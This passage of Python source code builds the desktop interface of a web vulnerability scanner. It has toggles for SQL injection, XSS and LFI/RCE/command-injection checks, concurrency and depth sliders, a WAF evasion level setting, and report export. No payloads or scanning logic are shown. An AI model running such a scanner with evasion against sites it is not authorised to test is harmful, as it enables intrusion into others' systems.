        ctk.CTkLabel(self.sidebar, text='SCAN PROFILE', font=Fonts.LABEL, text_color=Theme.TEXT_SUB).pack(anchor='w', padx=20)
        self.profile_var = ctk.StringVar(value='Standard')
        self.seg_profile = ctk.CTkSegmentedButton(self.sidebar, values=['Standard', 'Intense'], variable=self.profile_var, selected_color=Theme.ACCENT_MAIN, selected_hover_color=Theme.ACCENT_HOVER, unselected_color=Theme.BG_ROOT, command=self._apply_profile_logic)
        self.seg_profile.pack(fill='x', padx=20, pady=(5, 20))
        self.btn_start = ctk.CTkButton(self.sidebar, text='INITIALIZE SCAN', height=50, font=Fonts.BOLD, fg_color=Theme.ACCENT_MAIN, hover_color=Theme.ACCENT_HOVER, text_color='black', command=self.on_start)
        self.btn_start.pack(fill='x', padx=20, pady=10)
        self.btn_pause = ctk.CTkButton(self.sidebar, text='PAUSE', height=40, state='disabled', fg_color='transparent', border_width=1, border_color=Theme.WARNING, text_color=Theme.WARNING, command=self.on_pause)
        self.btn_pause.pack(fill='x', padx=20, pady=(0, 10))
        self.btn_stop = ctk.CTkButton(self.sidebar, text='ABORT OPERATION', height=40, state='disabled', fg_color=Theme.BG_CARD, hover_color=Theme.DANGER, text_color=Theme.DANGER, command=self.on_stop)
        self.btn_stop.pack(fill='x', padx=20, pady=(0, 20))
        ctk.CTkFrame(self.sidebar, fg_color='transparent').pack(expand=True)
        ctk.CTkLabel(self.sidebar, text='System Ready', font=Fonts.MONO_SM, text_color=Theme.SUCCESS).pack(pady=10)

    def _build_main_area(self):
        self.main = ctk.CTkFrame(self, fg_color='transparent')
        self.main.grid(row=0, column=1, sticky='nsew', padx=20, pady=20)
        self.main.grid_rowconfigure(1, weight=1)
        self.main.grid_columnconfigure(0, weight=1)
        self.dash_frame = ctk.CTkFrame(self.main, fg_color='transparent')
        self.dash_frame.grid(row=0, column=0, sticky='ew', pady=(0, 20))
        self.dash_frame.grid_columnconfigure((0, 1, 2, 3), weight=1)
        self.card_reqs = StatCard(self.dash_frame, 'REQUESTS', '0', Theme.ACCENT_MAIN, '🚀')
        self.card_reqs.grid(row=0, column=0, padx=5, sticky='ew')
        self.card_vulns = StatCard(self.dash_frame, 'VULNERABILITIES', '0', Theme.DANGER, '💀')
        self.card_vulns.grid(row=0, column=1, padx=5, sticky='ew')
        self.card_crawl = StatCard(self.dash_frame, 'NODES CRAWLED', '0', Theme.WARNING, '🕷️')
        self.card_crawl.grid(row=0, column=2, padx=5, sticky='ew')
        self.card_time = StatCard(self.dash_frame, 'DURATION', '00:00', Theme.TEXT_MAIN, '⏱️')
        self.card_time.grid(row=0, column=3, padx=5, sticky='ew')
        self.tabs = ctk.CTkTabview(self.main, fg_color=Theme.BG_SIDEBAR, segmented_button_selected_color=Theme.ACCENT_MAIN, segmented_button_selected_hover_color=Theme.ACCENT_HOVER, segmented_button_unselected_color=Theme.BG_ROOT, text_color=Theme.TEXT_MAIN)
        self.tabs.grid(row=1, column=0, sticky='nsew')
        self.tab_console = self.tabs.add('  TERMINAL OUTPUT  ')
        self.tab_config = self.tabs.add('  CONFIGURATION  ')
        self.tab_results = self.tabs.add('  FINDINGS LOG  ')
        self.tab_export = self.tabs.add('  EXPORT DATA  ')
        self.console = LogConsole(self.tab_console)
        self.console.pack(fill='both', expand=True, padx=10, pady=10)
        self._build_config_tab()
        self.scroll_results = ctk.CTkScrollableFrame(self.tab_results, fg_color='transparent')
        self.scroll_results.pack(fill='both', expand=True, padx=5, pady=5)
        self._build_export_tab()
        self.status_bar = ctk.CTkFrame(self.main, height=30, fg_color='transparent')
        self.status_bar.grid(row=2, column=0, sticky='ew', pady=(10, 0))
        self.progress = ctk.CTkProgressBar(self.status_bar, height=4, progress_color=Theme.ACCENT_MAIN)
        self.progress.pack(fill='x')
        self.progress.set(0)
        self.lbl_status = ctk.CTkLabel(self.status_bar, text='IDLE - WAITING FOR TARGET', font=Fonts.MONO_SM, text_color=Theme.TEXT_SUB)
        self.lbl_status.pack(anchor='e', pady=2)

    def _build_config_tab(self):
        container = ctk.CTkFrame(self.tab_config, fg_color='transparent')
        container.pack(fill='both', expand=True, padx=20, pady=20)
        col1 = ctk.CTkFrame(container, fg_color='transparent')
        col1.pack(side='left', fill='both', expand=True, padx=(0, 10))
        ctk.CTkLabel(col1, text='CONCURRENCY & TIMING', font=Fonts.SUBHEAD, text_color=Theme.ACCENT_MAIN).pack(anchor='w', pady=(0, 15))
        ctk.CTkLabel(col1, text='Thread Count', font=Fonts.LABEL).pack(anchor='w')
        self.sld_threads = ctk.CTkSlider(col1, from_=1, to=30, number_of_steps=29, progress_color=Theme.ACCENT_MAIN)
        self.sld_threads.pack(fill='x', pady=(5, 20))
        self.sld_threads.set(5)
        ctk.CTkLabel(col1, text='Request Delay (sec)', font=Fonts.LABEL).pack(anchor='w')
        self.sld_delay = ctk.CTkSlider(col1, from_=0, to=5, number_of_steps=50, progress_color=Theme.WARNING)
        self.sld_delay.pack(fill='x', pady=(5, 20))
        self.sld_delay.set(0)
        ctk.CTkLabel(col1, text='Scan Depth', font=Fonts.LABEL).pack(anchor='w')
        self.sld_depth = ctk.CTkSlider(col1, from_=1, to=5, number_of_steps=4, progress_color=Theme.SUCCESS)
        self.sld_depth.pack(fill='x', pady=(5, 20))
        self.sld_depth.set(2)
        col2 = ctk.CTkFrame(container, fg_color='transparent')
        col2.pack(side='right', fill='both', expand=True, padx=(10, 0))
        ctk.CTkLabel(col2, text='ATTACK VECTORS', font=Fonts.SUBHEAD, text_color=Theme.ACCENT_MAIN).pack(anchor='w', pady=(0, 15))
        self.sw_sqli = ctk.CTkSwitch(col2, text='SQL Injection (Classic & Blind)', progress_color=Theme.ACCENT_MAIN)
        self.sw_sqli.pack(anchor='w', pady=5)
        self.sw_sqli.select()
        self.sw_xss = ctk.CTkSwitch(col2, text='Cross-Site Scripting (XSS)', progress_color=Theme.ACCENT_MAIN)
        self.sw_xss.pack(anchor='w', pady=5)
        self.sw_lfi = ctk.CTkSwitch(col2, text='LFI / RCE / Command Inj', progress_color=Theme.ACCENT_MAIN)
        self.sw_lfi.pack(anchor='w', pady=5)
        self.sw_crawl = ctk.CTkSwitch(col2, text='Deep Heuristic Crawl', progress_color=Theme.ACCENT_MAIN)
        self.sw_crawl.pack(anchor='w', pady=5)
        self.sw_crawl.select()
        ctk.CTkLabel(col2, text='WAF EVASION LEVEL', font=Fonts.SUBHEAD, text_color=Theme.ACCENT_MAIN).pack(anchor='w', pady=(20, 10))
        self.opt_evasion = ctk.CTkOptionMenu(col2, values=['Low', 'Medium', 'High', 'Insane'], fg_color=Theme.BG_ROOT, button_color=Theme.BORDER)
        self.opt_evasion.pack(fill='x')

    def _build_export_tab(self):
        center = ctk.CTkFrame(self.tab_export, fg_color='transparent')
        center.pack(expand=True)
        ctk.CTkLabel(center, text='REPORT GENERATION', font=Fonts.HEADER, text_color='white').pack(pady=(0, 30))
        self.btn_html = ctk.CTkButton(center, text='Export HTML Report', width=250, height=40, fg_color=Theme.BG_CARD, border_color=Theme.ACCENT_MAIN, border_width=1, command=lambda: self.save_report('html'))
        self.btn_html.pack(pady=10)
        self.btn_json = ctk.CTkButton(center, text='Export JSON Data', width=250, height=40, fg_color=Theme.BG_CARD, border_color=Theme.WARNING, border_width=1, command=lambda: self.save_report('json'))
        self.btn_json.pack(pady=10)
        self.btn_pdf = ctk.CTkButton(center, text='Export PDF Summary', width=250, height=40, fg_color=Theme.BG_CARD, border_color=Theme.DANGER, border_width=1, command=lambda: self.save_report('pdf'))
        self.btn_pdf.pack(pady=10)

    def show_custom_popup(self, title, message, mode='info', callback=None):
        CyberPopup(self, title, message, mode, callback)

    def _apply_profile_logic(self, value):
        if value == 'Intense':
            self.sld_threads.set(15)
            self.sld_depth.set(3)
            self.sw_sqli.select()
            self.sw_xss.select()
            self.sw_lfi.select()
            self.sw_crawl.select()
            self.opt_evasion.set('High')
            self.console.log('Profile switched to INTENSE. High concurrency, full attack vector.', 'warn')
        else:
            self.sld_threads.set(5)
            self.sld_depth.set(2)
            self.sw_sqli.select()
            self.sw_xss.deselect()
            self.sw_lfi.deselect()
            self.sw_crawl.select()
            self.opt_evasion.set('Low')
            self.console.log('Profile switched to STANDARD. Optimized for SQLi, low noise.', 'info')

    def _toggle_ui_state(self, scanning):
        state = 'disabled' if scanning else 'normal'
        self.entry_url.configure(state=state)
        self.seg_profile.configure(state=state)
        self.btn_start.configure(state=state)
        self.btn_stop.configure(state='normal' if scanning else 'disabled')
        self.btn_pause.configure(state='normal' if scanning else 'disabled')
        if scanning:
            self.tabs.set('  TERMINAL OUTPUT  ')

    def on_start(self):
        target = self.entry_url.get().strip()
        if not target:
            self.show_custom_popup('Input Error', 'Target URL is required to initiate scan protocols.', 'error')
            return
        self.is_scanning = True
        self.is_paused = False
        self.findings = []
        self.console.clear()
        for widget in self.scroll_results.winfo_children():
            widget.destroy()
        self.card_reqs.update_value(0)
        self.card_vulns.update_value(0)
        self.card_crawl.update_value(0)
        self.card_time.update_value('00:00')
        self._toggle_ui_state(True)
        self.lbl_status.configure(text='SCANNING IN PROGRESS...')
        opts = {'crawl': self.sw_crawl.get(), 'depth': int(self.sld_depth.get()), 'threads': int(self.sld_threads.get()), 'delay': self.sld_delay.get(), 'sqli': self.sw_sqli.get(), 'xss': self.sw_xss.get(), 'lfi': self.sw_lfi.get(), 'rce': self.sw_lfi.get(), 'evasion': self.opt_evasion.get()}
        t = threading.Thread(target=self.scanner.start_scan, args=(target, opts), daemon=True)
        t.start()

    def on_pause(self):
        if not self.is_scanning:
            return
        paused = self.scanner.toggle_pause()
        self.is_paused = paused
        if paused:
            self.btn_pause.configure(text='RESUME', text_color=Theme.SUCCESS, border_color=Theme.SUCCESS)
            self.lbl_status.configure(text='SCAN PAUSED')
            self.console.log('Scan paused by user.', 'warn')
        else:
            self.btn_pause.configure(text='PAUSE', text_color=Theme.WARNING, border_color=Theme.WARNING)
            self.lbl_status.configure(text='SCANNING IN PROGRESS...')
            self.console.log('Scan resumed.', 'success')

    def on_stop(self):
        def _stop_callback(confirmed):
            if confirmed:
                self.scanner.stop()
                self.console.log('ABORT SIGNAL SENT. STOPPING...', 'danger')
        self.show_custom_popup('Confirm Abort', 'Are you sure you want to stop the scan?', 'confirm', _stop_callback)

    def _update_timer(self):
        if self.is_scanning and (not self.is_paused):
            elapsed = int(time.time() - self.scanner.stats['start_time'])
            m, s = divmod(elapsed, 60)
            self.card_time.update_value(f'{m:02d}:{s:02d}')
        self.after(1000, self._update_timer)

    def _process_queue(self):
        try:
            while True:
                msg_type, data = self.queue.get_nowait()
                if msg_type == 'log':
                    self.console.log(data['text'], data['level'])
                elif msg_type == 'stats':
                    self.card_reqs.update_value(data['requests'])
                    self.card_crawl.update_value(data['crawled'])
                elif msg_type == 'progress':
                    self.progress.set(data)
                    if not self.is_paused:
                        self.lbl_status.configure(text=f'SCANNING... {int(data * 100)}%')
                elif msg_type == 'vuln':
                    self.findings.append(data)
                    self.card_vulns.update_value(len(self.findings))
                    FindingWidget(self.scroll_results, data).pack(fill='x', pady=5)
                    self.console.log(f"VULNERABILITY FOUND: {data['type']}", 'danger')
                elif msg_type == 'done':
                    self.is_scanning = False
                    self._toggle_ui_state(False)
                    self.progress.set(1)
                    self.lbl_status.configure(text='SCAN COMPLETED')
                    self.btn_pause.configure(text='PAUSE', text_color=Theme.WARNING, border_color=Theme.WARNING)
                    self.show_custom_popup('Scan Complete', f'Scan finished successfully.\nFound {len(self.findings)} vulnerabilities.', 'success')
        except queue.Empty:
            pass
        finally:
            self.after(100, self._process_queue)

    def save_report(self, fmt):
        if not self.findings:
            self.show_custom_popup('No Data', 'No vulnerabilities were found to report.', 'error')
            return
        ts = int(time.time())
        target = self.entry_url.get() or 'Target'
        safe_target = re.sub('\\W+', '_', target)
        if fmt == 'html':
            path = filedialog.asksaveasfilename(defaultextension='.html', initialfile=f'scan_{safe_target}_{ts}.html')
            if path:
                if Reporter.save_html(self.findings, target, path):
                    self.show_custom_popup('Success', 'HTML Report saved successfully.', 'success')
                    webbrowser.open(path)
        elif fmt == 'json':
            path = filedialog.asksaveasfilename(defaultextension='.json', initialfile=f'scan_{safe_target}_{ts}.json')
            if path:
                Reporter.save_json(self.findings, target, path)
                self.show_custom_popup('Success', 'JSON Data Exported.', 'success')
        elif fmt == 'pdf':
            if not PDF_AVAILABLE:
                self.show_custom_popup('Missing Dependency', 'FPDF library not found.\nRun: pip install fpdf', 'error')
                return
            path = filedialog.asksaveasfilename(defaultextension='.pdf', initialfile=f'report_{safe_target}_{ts}.pdf')
            if path:
                Reporter.save_pdf(self.findings, target, path)
                self.show_custom_popup('Success', 'PDF Report Generated.', 'success')
                webbrowser.open(path)

if __name__ == '__main__':
    app = App()
    app.mainloop()